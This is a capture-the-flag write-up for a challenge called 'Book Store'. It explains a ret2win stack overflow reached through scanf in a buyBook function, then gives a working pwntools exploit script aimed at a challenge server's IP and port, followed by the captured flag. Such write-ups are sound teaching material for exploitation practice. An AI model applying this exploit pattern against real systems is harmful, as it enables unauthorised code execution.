# Book Store

Given an IP and port `34.101.234.148:8128` and an ELF file named `vuln`, we attempt to decompile it to understand how it works.

There is a function called `secretBook` which contains the flag, but it is not called in the main function. Then, in the buyBook function, it asks a string input of 50 characters using scanf. This is where the ret2win is.

```py
from pwn import *

elf = ELF("./vuln")
rop = ROP(elf)
r = remote("34.101.234.148", 8128)

print(r.recvuntil(': '))
r.sendline(b"1")

payload = b"A" * 58
payload += p32(rop.find_gadget(["ret"])[0])
payload += p32(elf.sym["secretBook"])
r.sendline(payload)
r.interactive()
```
```
JCTF2023{ur_ret2w1n_5ecr3t_b00k_i5_h3re}
```